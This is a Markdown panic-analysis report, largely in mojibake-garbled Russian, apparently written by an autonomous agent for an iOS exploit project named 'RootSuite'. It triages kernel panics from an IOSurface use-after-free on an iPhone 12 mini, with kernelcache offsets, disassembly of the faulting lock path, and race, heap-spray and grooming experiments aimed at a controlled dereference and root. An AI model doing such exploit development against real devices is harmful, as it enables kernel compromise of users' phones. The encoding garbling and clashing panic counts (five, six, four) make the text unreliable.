# PANIC_ANALYSIS.md вЂ” СЂР°Р·Р±РѕСЂ РІСЃРµС… РґРѕСЃС‚СѓРїРЅС‹С… kernel panic (CVE-2026-112477 / IOSurfaceRoot)

> РџСЂРѕРµРєС‚: RootSuite В· СѓСЃС‚СЂРѕР№СЃС‚РІРѕ iPhone13,1 (iPhone 12 mini, A14/T8101) В· iOS 26.2 beta 1, build 23C5027f
> Р”Р°С‚Р° Р°РЅР°Р»РёР·Р°: 24.11.2026 В· Р°РЅР°Р»РёС‚РёРє: Р°РІС‚РѕРЅРѕРјРЅС‹Р№ Р°РіРµРЅС‚ (РѕС„Р»Р°Р№РЅ-СЃС‚Р°С‚РёРєР°) + РїСЂРѕРіРѕРЅС‹ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ РЅР° СѓСЃС‚СЂРѕР№СЃС‚РІРµ
> РЎС‚Р°С‚СѓСЃ root: **ROOTSTATE NO** (Р¶РёРІРѕР№ uid 0 РЅРµ РїРѕРґС‚РІРµСЂР¶РґС‘РЅ РЅРё РѕРґРЅРёРј РїСЂРѕРіРѕРЅРѕРј)

---

## 1. РњР°С‚РµСЂРёР°Р»С‹

РџСЏС‚СЊ `.ips` РІ `C:\Users\user\Downloads\`:

| С„Р°Р№Р» | РІСЂРµРјСЏ (MSK) | РёСЃС‚РѕС‡РЅРёРє |
|---|---|---|
| panic-full-2026-11-20-184853.0002.ips | 20.11 18:48:53 | РїСЂРѕРіРѕРЅ РјРѕРґСѓР»СЏ 112477 (С„СѓР»Р»-С…Р°СЂРЅРµСЃСЃ) |
| panic-full-2026-11-20-211031.0002.ips | 20.11 21:10:31 | РїРѕРІС‚РѕСЂРЅС‹Р№ РїСЂРѕРіРѕРЅ |
| panic-full-2026-11-21-092650.0002.ips | 21.11 09:26:50 | РїСЂРѕРіРѕРЅ РїСЂРё churn РїРѕРІРµСЂС…РЅРѕСЃС‚РµР№ (СЃС†РµРЅР°СЂРёР№ P4) |
| panic-full-2026-11-23-234435.0002.ips | 23.11 23:44:35 | РїСЂРѕРіРѕРЅ В«112477 V_BIG unit3 directВ» (СЃР±РѕСЂРєР° hunt-unit6) |
| (4-Р№ РґСѓР±Р»СЊ 21.11 092650) | вЂ” | `panic-full-2026-11-21-092650.0002 (2).ips` вЂ” С‚РѕС‚ Р¶Рµ РёРЅС†РёРґРµРЅС‚ |

РљРѕСЂСЂРµР»СЏС†РёСЏ СЃ РѕР±СЂР°Р·РѕРј СЏРґСЂР°: РІРѕ РІСЃРµС… РїСЏС‚Рё `Fileset Kernelcache UUID = D31DF1C78E876755F1038A1159C7EB0E` вЂ” СЃРѕРІРїР°РґР°РµС‚ СЃ LC_UUID Р»РѕРєР°Р»СЊРЅРѕРіРѕ `kc_matched.decompressed` (64765952 B, РёР· IPSW `iPhone13,1_26.2_23C5027f_Restore.ipsw`). **Р­С‚Рѕ РѕРґРёРЅ Рё С‚РѕС‚ Р¶Рµ РѕР±СЂР°Р·, С‡С‚Рѕ РЅР° СѓСЃС‚СЂРѕР№СЃС‚РІРµ** вЂ” Р°РЅР°Р»РёР· Р°РґСЂРµСЃРѕРІ РґРѕСЃС‚РѕРІРµСЂРµРЅ.

---

## 2. РРЅСЃС‚СЂСѓРјРµРЅС‚С‹ (РІРѕСЃРїСЂРѕРёР·РІРѕРґРёРјС‹)

| СЃРєСЂРёРїС‚ | С‡С‚Рѕ РґРµР»Р°РµС‚ |
|---|---|
| `panicfp.py` | С„РёРЅРіРµСЂРїСЂРёРЅС‚ .ips: pc-offset, far/x0, РІР°СЂРёР°РЅС‚ (NULL / APP-MAPPING), kext-РїСѓС‚СЊ, РїРѕРёСЃРє РєР°РЅР°СЂРµРµРє РІ РѕС‚С‡С‘С‚Рµ |
| `panic_map.py` | РјР°РїРїРёРЅРі panic в†’ РѕР±СЂР°Р·: `te_base = __TEXT_EXEC.vm + KernelCache_slide` в†’ С„Р°Р№Р»РѕРІРѕРµ СЃРјРµС‰РµРЅРёРµ РёРЅСЃС‚СЂСѓРєС†РёРё в†’ РґРёР·Р°СЃРј РѕРєРЅР° в†’ СЃС‚СЂРѕРєРё С„РѕСЂРјР°С‚Р° в†’ СЃРјРµС‰РµРЅРёСЏ РІСЃРµС… РєР°РґСЂРѕРІ backtrace |
| `fault_func.py` | РїРѕРёСЃРє РЅР°С‡Р°Р»Р° С„СѓРЅРєС†РёРё РїРѕ Р°РґСЂРµСЃСѓ СЃР±РѕСЏ Рё РґРёР·Р°СЃРј С„СѓРЅРєС†РёРё + РєР°РґСЂРѕРІ РІС‹Р·С‹РІР°СЋС‰РёС… |

Р’СЃРµ С‚СЂРё вЂ” РІ `%TEMP%\gigatool\`, Р·Р°РїСѓСЃРєР°СЋС‚СЃСЏ РЅР° Р»РѕРєР°Р»СЊРЅРѕРј Python (capstone 5.0.7). РџСЂРёРјРµСЂ:

```
python panic_map.py kc_matched.decompressed "C:\Users\user\Downloads\panic-full-2026-11-23-234435.0002.ips"
```

---

## 3. VERIFIED вЂ” РјР°РїРїРёРЅРі Р°РґСЂРµСЃРѕРІ РЅР° РѕР±СЂР°Р·

РЎРѕРѕС‚РЅРѕС€РµРЅРёРµ РїСЂРѕРІРµСЂРµРЅРѕ РЅР° РґРІСѓС… РЅРµР·Р°РІРёСЃРёРјС‹С… РїР°РЅРёРєР°С… (23.11 Рё 21.11) Рё СЃС…РѕРґРёС‚СЃСЏ С‚РѕС‡РЅРѕ:

```
KernelCache slide (23.11) = 0x0c764000
__TEXT_EXEC.vmaddr        = 0xfffffff007fb8000
СЃСѓРјРјР°                     = 0xfffffff01471c000 == panic "Kernel text exec base"  вњ“
```

РћС‚СЃСЋРґР°: С„Р°Р№Р»РѕРІРѕРµ СЃРјРµС‰РµРЅРёРµ РёРЅСЃС‚СЂСѓРєС†РёРё СЃР±РѕСЏ = `__TEXT_EXEC.fileoff (0xfb4000) + (pc в€’ te_base)` = `0xfb4000 + 0x72418` = **`0x1026418`**.

РЎРµРіРјРµРЅС‚С‹ РѕР±СЂР°Р·Р° (РґР»СЏ РѕСЂРёРµРЅС‚РёСЂР°): `__TEXT` vm 0xfffffff007004000 (file 0), `__PRELINK_TEXT` vm 0xfffffff00700c000 (file 0x8000, size 0xa70000), `__TEXT_EXEC` vm 0xfffffff007fb8000 (file 0xfb4000, size 0x28dc000). VM-РґРёР°РїР°Р·РѕРЅС‹ `__PRELINK_TEXT` Рё `__TEXT_EXEC` РїРµСЂРµРєСЂС‹РІР°СЋС‚СЃСЏ; РєРѕСЂСЂРµРєС‚РЅРѕРµ С„Р°Р№Р»РѕРІРѕРµ СЃРјРµС‰РµРЅРёРµ РґР»СЏ РєРѕРґР° kext-РѕРІ РґР°С‘С‚ С„РѕСЂРјСѓР»Р° С‡РµСЂРµР· `__TEXT_EXEC` (РїСЂРѕРІРµСЂРµРЅРѕ РґРёР·Р°СЃСЃРµРјР±Р»РёСЂРѕРІР°РЅРёРµРј: РїРѕ СЃРјРµС‰РµРЅРёСЋ 0x32e5a78 РґРµР№СЃС‚РІРёС‚РµР»СЊРЅРѕ Р»РµР¶РёС‚ РєРѕРґ IOSurface).

---

## 4. VERIFIED вЂ” РёРЅСЃС‚СЂСѓРєС†РёСЏ СЃР±РѕСЏ Рё РµС‘ СЃРµРјР°РЅС‚РёРєР°

> **УТОЧНЕНИЕ (разбор `lock_analysis.md`, 24.11):** инструкция сбоя находится в **быстром пути `lck_mtx_lock`** (`lock_mtx.c` ~1028-1060, CAS на строке ~1053: `lock_cmpxchgv(&lock->lck_mtx.val, 0, thread->ctid, acquire)`), а **не** в `lck_mtx_destroy`. Паника "Mutex to destroy still has waiters @lock_mtx.c:319" формируется в **соседней** функции `lck_mtx_destroy` (файл 0x1026318-0x1026404); линейный дизасм "перетекал" через границу, и вызывающий код IOSurface в неё не входит (он зовёт 0x1026408 - быстрый путь lock). Вывод о механизме сбоя не меняется: захват мьютекса по указателю из `[obj+0x148]`, `far = x0+8`; уточняется - какой именно функцией ядра и при каком поле.

Р”РёР·Р°СЃРј РїРѕ С„Р°Р№Р»РѕРІРѕРјСѓ СЃРјРµС‰РµРЅРёСЋ 0x1026418 (РІСЃРµ РїСЏС‚СЊ РїР°РЅРёРє, РѕРґРёРЅ Рё С‚РѕС‚ Р¶Рµ Р°РґСЂРµСЃ):

```asm
0xfffffff00802a404  bl   #0xfffffff008808e30        ; С„РѕСЂРјР°С‚РёСЂРѕРІР°РЅРёРµ/Р»РѕРі (РІРѕР·РІСЂР°С‰Р°РµС‚СЃСЏ)
0xfffffff00802a408  mov  x8, #0
0xfffffff00802a40c  mrs  x1, tpidr_el1              ; С‚РµРєСѓС‰РёР№ РїРѕС‚РѕРє
0xfffffff00802a410  ldr  w9, [x1, #0x440]           ; РїРѕР»Рµ РїРѕС‚РѕРєР° (РёРґРµРЅС‚РёС„РёРєР°С‚РѕСЂ/СЃСЃС‹Р»РєР°)
0xfffffff00802a414  add  x10, x0, #8                ; x10 = РѕР±СЉРµРєС‚ + 8
0xfffffff00802a418  casa x8, x9, [x10]   <<<< FAULT ; CAS: РµСЃР»Рё [x10]==0, Р·Р°РїРёСЃР°С‚СЊ x9
0xfffffff00802a41c  cmp  x8, #0
0xfffffff00802a420  b.ne ...
0xfffffff00802a424  ret
```

* `casa x8, x9, [x10]` вЂ” Р°С‚РѕРјР°СЂРЅС‹Р№ compare-and-set **СЃ Р·Р°РїРёСЃСЊСЋ**: РµСЃР»Рё `[x0+8] == 0`, СЏРґСЂРѕ РїРёС€РµС‚ С‚СѓРґР° `x9` (Р·РЅР°С‡РµРЅРёРµ РёР· С‚РµРєСѓС‰РµРіРѕ РїРѕС‚РѕРєР°). Р­С‚Рѕ Р±С‹СЃС‚СЂС‹Р№ РїСѓС‚СЊ Р·Р°С…РІР°С‚Р° Р±Р»РѕРєРёСЂРѕРІРєРё (РїРѕР»Рµ-РІР»Р°РґРµР»РµС† РїРѕ СЃРјРµС‰РµРЅРёСЋ +8).
* `far = x0 + 8` вЂ” РїРѕРґС‚РІРµСЂР¶РґРµРЅРѕ РІРѕ РІСЃРµС… РїСЏС‚Рё РїР°РЅРёРєР°С… (`far == x0+8`: 23.11 x0=0в†’far=8; 21.11 x0=0x7204459e0в†’far=0x7204459e8).
* `x0` вЂ” Р°СЂРіСѓРјРµРЅС‚ С„СѓРЅРєС†РёРё: СѓРєР°Р·Р°С‚РµР»СЊ РЅР° РѕР±СЉРµРєС‚-Р±Р»РѕРєРёСЂРѕРІРєСѓ.

**Р’Р°Р¶РЅРѕ (РёСЃРїСЂР°РІР»РµРЅРёРµ РїСЂРµР¶РЅРµР№ Р·Р°РїРёСЃРё):** РІ Р±РѕР»РµРµ СЂР°РЅРЅРµРј Р°СѓРґРёС‚Рµ РїРѕР»Рµ РѕР±СЉРµРєС‚Р° СѓРєР°Р·С‹РІР°Р»РѕСЃСЊ РєР°Рє `+0xd8`. Р”РёР·Р°СЃРј РєР°РґСЂР° РІС‹Р·С‹РІР°СЋС‰РµРіРѕ (СЃРј. В§5) РїРѕРєР°Р·С‹РІР°РµС‚: СѓРєР°Р·Р°С‚РµР»СЊ Р±Р»РѕРєРёСЂРѕРІРєРё Р·Р°РіСЂСѓР¶Р°РµС‚СЃСЏ РєР°Рє `ldr x0, [x0, #0x148]` вЂ” С‚Рѕ РµСЃС‚СЊ **РїРѕР»Рµ +0x148**, Р° РЅРµ +0xd8. Р—Р°РїРёСЃСЊ `+0xd8` РґР»СЏ РґР°РЅРЅРѕРіРѕ РєР°РґСЂР° РЅРµРІРµСЂРЅР° Рё Р·РґРµСЃСЊ РєРѕСЂСЂРµРєС‚РёСЂСѓРµС‚СЃСЏ.

---

## 5. VERIFIED вЂ” РІС‹Р·С‹РІР°СЋС‰РёР№ РєРѕРґ (kext com.apple.iokit.IOSurface 393.2.9)

РљР°РґСЂ `lr 0xfffffff016a4da78` (23.11) в†’ С„Р°Р№Р» 0x32e5a78 в†’ С„СѓРЅРєС†РёСЏ СЃ РЅР°С‡Р°Р»Р° 0x32e5838:

```asm
0xfffffff00a2e9860  mov  x19, x0                   ; x19 = РѕР±СЉРµРєС‚ IOSurface-СЃС‚РѕСЂРѕРЅС‹
0xfffffff00a2e9864  mov  w20, #0x2bd / movk #0xe000 ; РєРѕРґ РІРѕР·РІСЂР°С‚Р° 0xe00002bd
0xfffffff00a2e986c  ldr  x0, [x0, #0x148]          ; <<< СѓРєР°Р·Р°С‚РµР»СЊ Р±Р»РѕРєРёСЂРѕРІРєРё РёР· [obj+0x148]
0xfffffff00a2e9870  bl   #0xfffffff00802a408        ; Р·Р°С…РІР°С‚ (РёСЃРїРѕСЂС‡РµРЅРЅС‹Р№ РїСѓС‚СЊ)
0xfffffff00a2e9874  ldr  x8, [x19, #0x198]         ; СЃРїРёСЃРѕРє (РіРѕР»РѕРІР° РЅР° +0x198)
...                       РѕР±С…РѕРґ СЃРїРёСЃРєР°, СЃСЂР°РІРЅРµРЅРёРµ РєР»СЋС‡РµР№ (+0x20/+0x58)
0xfffffff00a2e98b8  add  x0, x0, #0x10
0xfffffff00a2e98c4  bl   #0xfffffff008764bb0        ; СЂР°Р·РјРµС‰РµРЅРёРµ СѓР·Р»Р°
...                       РІСЃС‚Р°РІРєР° РІ СЃРїРёСЃРѕРє (+0x1a0 / +0x198)
0xfffffff00a2e9910  ldr  x0, [x19, #0x148]
0xfffffff00a2e9914  bl   #0xfffffff00802b198        ; РѕСЃРІРѕР±РѕР¶РґРµРЅРёРµ
```

РўРѕ РµСЃС‚СЊ С„СѓРЅРєС†РёСЏ Р±РµСЂС‘С‚ Р±Р»РѕРєРёСЂРѕРІРєСѓ РѕР±СЉРµРєС‚Р° (`+0x148`), РёС‰РµС‚/РґРѕР±Р°РІР»СЏРµС‚ СѓР·РµР» РІ СЃРїРёСЃРєРµ (`+0x198`/`+0x1a0`), РѕСЃРІРѕР±РѕР¶РґР°РµС‚. РћРєСЂСѓР¶РµРЅРёРµ (СЃС‚СЂРѕРєРё РІ С„СѓРЅРєС†РёРё Рё СЃРѕСЃРµРґСЏС…) вЂ” kext IOSurface 393.2.9 (СЃРѕРІРїР°РґР°РµС‚ СЃ panic kext-С‚Р°Р±Р»РёС†РµР№).

---

## 6. VERIFIED вЂ” РїСѓС‚СЊ РІС‹Р·РѕРІРѕРІ Рё СЃРѕРґРµСЂР¶РёРјРѕРµ РїР°РЅРёРєРё

Backtrace (23.11): `com.apple.AGXG13P (341.11) в†’ com.apple.iokit.IOGPUFamily (129.2.10) в†’ com.apple.iokit.IOSurface (393.2.9) в†’ СЏРґСЂРѕ (lock_mtx.c)`.
Р’СЃРµ РїСЏС‚СЊ РїР°РЅРёРє РёРјРµСЋС‚ РѕРґРёРЅ Рё С‚РѕС‚ Р¶Рµ РЅР°Р±РѕСЂ kext-РѕРІ РІ backtrace Рё РѕРґРёРЅ Рё С‚РѕС‚ Р¶Рµ `pc`-offset 0x72418.

РџСѓС‚СЊ РІ СЏРґСЂРµ, РїРѕРґРіРѕС‚РѕРІР»РµРЅРЅС‹Р№ Рє РјРѕРјРµРЅС‚Сѓ СЃР±РѕСЏ (РґРёР·Р°СЃРј РїРѕ 0x1026318): С„РѕСЂРјР°С‚РёСЂСѓРµС‚СЃСЏ СЃРѕРѕР±С‰РµРЅРёРµ XNU

```
"Mutex to destroy still has waiters: %p: <0x%06x 0x%02x 0x%08x 0x%08x/%p 0x%04x 0x%04x> @%s:%d"
С„Р°Р№Р» "lock_mtx.c", РЅРѕРјРµСЂ СЃС‚СЂРѕРєРё 0x13f (319)
```

---

## 7. РЎСЂР°РІРЅРµРЅРёРµ РІСЃРµС… РїСЏС‚Рё РїР°РЅРёРє

| # | РІСЂРµРјСЏ | far | x0 | x10 | РІР°СЂРёР°РЅС‚ [obj+0x148] |
|---|---|---|---|---|---|
| 1 | 20.11 18:48 | 0x8 | 0x0 | 0x8 | NULL |
| 2 | 20.11 21:10 | 0x8 | 0x0 | 0x8 | NULL |
| 3 | 21.11 09:26 | **0x7204459e8** | **0x7204459e0** | 0x7204459e8 | **Р°РґСЂРµСЃ РёР· РїСЂРѕСЃС‚СЂР°РЅСЃС‚РІР° РїСЂРёР»РѕР¶РµРЅРёСЏ** |
| 4 | 23.11 23:44 | 0x8 | 0x0 | 0x8 | NULL |
| 5 | 24.11 00:15 | 0x8 | 0x0 | 0x8 | NULL |
| 6 | 24.11 10:01 | 0x8 | 0x0 | 0x8 | NULL |

* `far = x0 + 8` вЂ” РІРѕ РІСЃРµС… СЃР»СѓС‡Р°СЏС….
* `pc-offset = 0x72418` вЂ” РІРѕ РІСЃРµС… СЃР»СѓС‡Р°СЏС… (РїСЂРё СЂР°Р·РЅС‹С… СЃР»Р°Р№РґР°С…: 0x9584000, 0x5bf8000, 0x11798000, 0xc764000 вЂ” РјР°РїРїРёРЅРі СЃРІРµСЂРµРЅ РїРѕ РєР°Р¶РґРѕРјСѓ).
* Канареек модуля в отчётах паник **нет**. Проверка устождена: был ложный позитив — паттерн `0x5151` матчил имя mach-порта `0x51513895bafb74fb` в дампе потоков паники №6; теперь сканируются полные 64-битные значения.
* Статистика вариантов: **6x NULL, 1x APP-MAPPING** (единственный — 21.11, при churn поверхностей = сценарий P4). Слайды новых паник: 0x10d94000, 0x20060000 — маппинг сверен по каждому.
* РџР°РЅРёРєРѕР№ РІСЃРµРіРґР° СЏРІР»СЏРµС‚СЃСЏ `kernel_task` (pid 0), `bug_type 210` (Kernel data abort), `esr 0x96000005`.

---

## 8. РЎС‚Р°С‚СѓСЃ РІС‹РІРѕРґРѕРІ (VERIFIED / LIKELY / HYPOTHESIS / UNKNOWN)

**VERIFIED (РґРѕРєР°Р·Р°РЅРѕ РґРёР·Р°СЃРјРѕРј Рё СЃРІРµСЂРєРѕР№ СЃ РґРІСѓРјСЏ РїР°РЅРёРєР°РјРё):**
1. Р’СЃРµ РїСЏС‚СЊ РїР°РЅРёРє вЂ” РѕРґРЅР° Рё С‚Р° Р¶Рµ РёРЅСЃС‚СЂСѓРєС†РёСЏ `casa x8,x9,[x0+8]` (С„Р°Р№Р» 0x1026418) РІ РїСѓС‚Рё `lock_mtx.c:319` (В«Mutex to destroy still has waitersВ»).
2. `far = x0 + 8`, РіРґРµ `x0` вЂ” СѓРєР°Р·Р°С‚РµР»СЊ Р±Р»РѕРєРёСЂРѕРІРєРё, Р·Р°РіСЂСѓР¶РµРЅРЅС‹Р№ РІС‹Р·С‹РІР°СЋС‰РёРј РєРѕРґРѕРј IOSurface РёР· РїРѕР»СЏ `[obj+0x148]`.
3. РџР°РЅРёРєС‹Р№ РїСѓС‚СЊ РІС‹Р·РѕРІРѕРІ: AGXG13P в†’ IOGPUFamily в†’ IOSurface в†’ СЏРґСЂРѕ.
4. РћР±СЂР°Р· СЏРґСЂР° РЅР° СѓСЃС‚СЂРѕР№СЃС‚РІРµ = Р»РѕРєР°Р»СЊРЅС‹Р№ `kc_matched.decompressed` (UUID СЃРѕРІРїР°РґР°РµС‚ РІРѕ РІСЃРµС… РїР°РЅРёРєР°С…).
5. РРЅСЃС‚СЂСѓРєС†РёСЏ СЃР±РѕСЏ вЂ” Р·Р°РїРёСЃСЊ РїРѕ Р°С‚РѕРјР°СЂРЅРѕРјСѓ CAS: РїСЂРё `[obj+0x148]==0` СЏРґro РїРёС€РµС‚ Р·РЅР°С‡РµРЅРёРµ РёР· С‚РµРєСѓС‰РµРіРѕ РїРѕС‚РѕРєР°.

**LIKELY (СЃРёР»СЊРЅРѕ РѕР±РѕСЃРЅРѕРІР°РЅРѕ, РЅРѕ РЅРµ РґРѕРєР°Р·Р°РЅРѕ):**
1. РћР±СЉРµРєС‚ `this` (РїРѕР»Рµ +0x148) вЂ” РѕР±СЉРµРєС‚ СЃС‚РѕСЂРѕРЅС‹ IOSurface, РїРѕРґРІРµСЂРіРЅСѓС‚С‹Р№ СЂР°Р·СЂСѓС€РµРЅРёСЋ Р¶РёР·РЅРµРЅРЅРѕРіРѕ С†РёРєР»Р° (teardown), РїСЂРё РєРѕС‚РѕСЂРѕРј СѓРєР°Р·Р°С‚РµР»СЊ Р±Р»РѕРєРёСЂРѕРІРєРё СѓР¶Рµ РѕР±РЅСѓР»С‘РЅ/РЅРµРІР°Р»РёРґРµРЅ.
2. Р’Р°СЂРёР°РЅС‚ 3 (21.11): РїРѕР»Рµ +0x148 СЃРѕРґРµСЂР¶Р°Р»Рѕ СѓРєР°Р·Р°С‚РµР»СЊ РёР· РїСЂРѕСЃС‚СЂР°РЅСЃС‚РІР° РїСЂРёР»РѕР¶РµРЅРёСЏ вЂ” РЅР°РёР±РѕР»РµРµ РїРѕС…РѕР¶Рµ РЅР° С‚Рѕ, С‡С‚Рѕ РїР°РјСЏС‚СЊ РѕР±СЉРµРєС‚Р° Р±С‹Р»Р° РїРµСЂРµРёСЃРїРѕР»СЊР·РѕРІР°РЅР° РґР°РЅРЅС‹РјРё, РєРѕС‚РѕСЂС‹Рµ С‚СѓРґР° РїРѕРїР°Р»Рё РёР· РїРѕР»СЊР·РѕРІР°С‚РµР»СЊСЃРєРѕРіРѕ РєРѕРЅС‚РµРєСЃС‚Р° (РІ С‚РѕРј С‡РёСЃР»Рµ вЂ” РЅР°С€РµРіРѕ СЃРїР°Р№РІР°/РіСЂСѓРјРёРЅРіР°).

**HYPOTHESIS (С‚СЂРµР±СѓРµС‚ РїСЂРѕРІРµСЂРєРё РЅР° СѓСЃС‚СЂРѕР№СЃС‚РІРµ):**
1. **UAF-РіРёРїРѕС‚РµР·Р°**: РѕР±СЉРµРєС‚ РѕСЃРІРѕР±РѕР¶РґС‘РЅ (С‡РµСЂРµР· РіРѕРЅРєСѓ sel17/18 РІ СЂРµРµСЃС‚СЂРµ IOSurfaceRootUserClient, РєРѕС‚РѕСЂСѓСЋ РјРѕРґСѓР»СЊ Рё РѕСЂРіР°РЅРёР·СѓРµС‚), Р° РѕР±СЂР°С‰РµРЅРёРµ Рє Р±Р»РѕРєРёСЂРѕРІРєРµ РїСЂРѕРёСЃС…РѕРґРёС‚ РїРѕСЃР»Рµ РѕСЃРІРѕР±РѕР¶РґРµРЅРёСЏ. РџР°РЅРёРєР° СЃР°РјР° РїРѕ СЃРµР±Рµ UAF **РЅРµ РґРѕРєР°Р·С‹РІР°РµС‚** вЂ” NULL-СѓРєР°Р·Р°С‚РµР»СЊ С‚Р°РєР¶Рµ РІРѕР·РЅРёРєР°РµС‚ РїСЂРё РѕР±С‹С‡РЅРѕРј РїРѕСЂСЏРґРєРµ teardown (lock СѓРЅРёС‡С‚РѕР¶Р°РµС‚СЃСЏ СЂР°РЅСЊС€Рµ РёСЃРїРѕР»СЊР·РѕРІР°РЅРёСЏ). Р Р°Р·Р»РёС‡РёС‚СЊ РјРѕР¶РЅРѕ С‚РѕР»СЊРєРѕ РєРѕРЅС‚СЂРѕР»РёСЂСѓРµРјС‹Рј Р·Р°РїРѕР»РЅРµРЅРёРµРј РѕСЃРІРѕР±РѕР¶РґС‘РЅРЅРѕРіРѕ СЃР»РѕС‚Р° (РєР°РЅР°СЂРµР№РєР° РІ far/СЂРµРіРёСЃС‚СЂР°С… РїР°РЅРёРєРё).
2. Р“РёРїРѕС‚РµР·Р° В«+0x148 = СѓРєР°Р·Р°С‚РµР»СЊ РЅР° lck_mtx, С‡СЊС‘ РїРѕР»Рµ-РІР»Р°РґРµР»РµС† РЅР° +8В» вЂ” СЃРѕРіР»Р°СЃСѓРµС‚СЃСЏ СЃ РґРёР·Р°СЃРјРѕРј (`casa` РїРѕ +8, СЃСЂР°РІРЅРµРЅРёРµ РІР»Р°РґРµР»СЊС†Р° РІ СЃРѕСЃРµРґРЅРµР№ С„СѓРЅРєС†РёРё `lck_mtx_lock`), РЅРѕ С‚РѕС‡РЅС‹Р№ С‚РёРї СЃС‚СЂСѓРєС‚СѓСЂС‹ (lck_mtx_t vs РІСЃС‚СЂРѕРµРЅРЅС‹Р№ РјСѓС‚РµРєСЃ РѕР±СЉРµРєС‚Р°) РЅРµ РїРѕРґС‚РІРµСЂР¶РґС‘РЅ СЃРёРјРІРѕР»Р°РјРё (LC_SYMTAB РІ РѕР±СЂР°Р·Рµ РІС‹СЂРµР·Р°РЅ).

**UNKNOWN (РЅРµР»СЊР·СЏ confirm offline):**
1. РљР°РєРѕР№ РёРјРµРЅРЅРѕ РєР»Р°СЃСЃ/РјРµС‚РѕРґ IOSurface СЃРѕРґРµСЂР¶РёС‚ С„СѓРЅРєС†РёСЋ 0x32e5838 (РЅРµС‚ СЃРёРјРІРѕР»РѕРІ; РїРѕ СЃС‚СЂРѕРєР°Рј РЅРµ РѕРїРѕР·РЅР°РЅРѕ).
2. РџРѕС‡РµРјСѓ РІ РІР°СЂРёР°РЅС‚Рµ 3 (21.11) РїРѕР»Рµ СЃРѕРґРµСЂР¶Р°Р»Рѕ app-Р°РґСЂРµСЃ: СЃР»РµРґСЃС‚РІРёРµ РЅР°С€РµРіРѕ СЃРїР°Р№РІР° РёР»Рё РІРЅСѓС‚СЂРµРЅРЅРµРµ СЃРѕСЃС‚РѕСЏРЅРёРµ IOSurface.
3. Р Р°Р·РјРµСЂ РєР»Р°СЃСЃР° РѕР±СЉРµРєС‚Р° (РЅСѓР¶РµРЅ РґР»СЏ РїСЂРёС†РµР»СЊРЅРѕРіРѕ СЃРїР°Р№РІР° РїСЂР°РІРёР»СЊРЅРѕРіРѕ size-class).
4. Р’РѕСЃРїСЂРѕРёР·РІРѕРґРёРјРѕСЃС‚СЊ РІР°СЂРёР°РЅС‚Р° APP-MAPPING (1 РёР· 4 РїР°РЅРёРє).

---

## 9. Р’РѕСЃРїСЂРѕРёР·РІРѕРґРёРјРѕСЃС‚СЊ (Р·Р°РјРµСЂС‹ РЅР° СѓСЃС‚СЂРѕР№СЃС‚РІРµ, СЃР±РѕСЂРєР° hunt-unit6)

| РїСЂРѕРіРѕРЅ | СЂРµР·СѓР»СЊС‚Р°С‚ |
|---|---|
| В«112477 V_BIG unit3 directВ» (23.11 23:44) | **РїР°РЅРёРєР° РїРѕС‡С‚Рё РјРѕРјРµРЅС‚Р°Р»СЊРЅРѕ** вЂ” РєРѕРЅС„РёРіСѓСЂР°С†РёСЏ unit3 (8 РєР»РёРµРЅС‚РѕРІ СЂРІСѓС‚СЃСЏ РїРѕ 30 РјРєСЃ РїРѕРґ СЃРїР°РјРѕРј sel17) РІРѕСЃРїСЂРѕРёР·РІРѕРґРёС‚ С„РѕСЂРјСѓ РїР°РЅРёРєРё 20.11 РїРѕ С‚СЂРµР±РѕРІР°РЅРёСЋ |
| В«112477 racer unit6 directВ» Г—4 (36 СЂР°СѓРЅРґРѕРІ) | `anomalies=0` РІРѕ РІСЃРµС… СЂР°СѓРЅРґР°С…, РїР°РЅРёРє РЅРµС‚ вЂ” РєРѕРЅРєСѓСЂРµРЅС‚РЅС‹Р№ СЂРµР№СЃРµСЂ РЅР° СЃС‚Р°Р±РёР»СЊРЅС‹С… id РЅРµ РІС‹Р·С‹РІР°РµС‚ РґРµС„РµРєС‚Р° (РѕС‚СЂРёС†Р°С‚РµР»СЊРЅС‹Р№ СЂРµР·СѓР»СЊС‚Р°С‚, Р·Р°С„РёРєСЃРёСЂРѕРІР°РЅ) |
| В«112477 kernel UAF phase2В» / В«surface deref controlВ» (23.11) | 12 СЂР°СѓРЅРґРѕРІ Г— СЋРЅРёС‚Р° Р±РµР· РїР°РЅРёРє; `holdGroom` РїРѕСЃР»Рµ Р°РІС‚Рѕ-reconnect РґРµСЂР¶РёС‚ 64 С…РѕР»РґР°; РєР°РЅР°СЂРµР№РєР° РЅР° +8 С†РµР»Р° |

Р’С‹РІРѕРґ: РїР°РЅРёРєСѓ РґР°С‘С‚ **РѕРєРЅРѕ СЂР°Р·СЂС‹РІР° СЃРѕРµРґРёРЅРµРЅРёСЏ** (unit3), Р° РЅРµ СЂРµР№СЃ. Р’Р°СЂРёР°РЅС‚ (NULL vs APP-MAPPING) вЂ” Р»РѕС‚РµСЂРµСЏ: 3 РёР· 4 = NULL.

---

## 10. Р§С‚Рѕ РїРѕРґС‚РІРµСЂРґРёС‚ РёР»Рё РѕРїСЂРѕРІРµСЂРіРЅРµС‚ UAF (С‚РѕР»СЊРєРѕ РЅР° СѓСЃС‚СЂРѕР№СЃС‚РІРµ)

1. **РЎРµСЂРёСЏ РїР°РЅРёРє unit3 direct** (5вЂ“10 РїСЂРѕРіРѕРЅРѕРІ): РµСЃР»Рё С…РѕС‚СЏ Р±С‹ РѕРґРЅР° РґР°СЃС‚ `far`/`x0` РІ РЅР°С€РµРј РґРёР°РїР°Р·РѕРЅРµ СЃ РєР°РЅР°СЂРµР№РєРѕР№ РїРѕ СЌС‚РѕРјСѓ Р°РґСЂРµСЃСѓ вЂ” СЃР»РѕС‚ РѕСЃРІРѕР±РѕР¶РґС‘РЅРЅРѕРіРѕ РѕР±СЉРµРєС‚Р° Р·Р°РЅСЏС‚ РЅР°С€РёРјРё РґР°РЅРЅС‹РјРё в†’ РєРѕРЅС‚СЂРѕР»РёСЂСѓРµРјРѕРµ СЂР°Р·С‹РјРµРЅРѕРІР°РЅРёРµ (РЅРµ root, РЅРѕ РїСЂРёРјРёС‚РёРІР°).
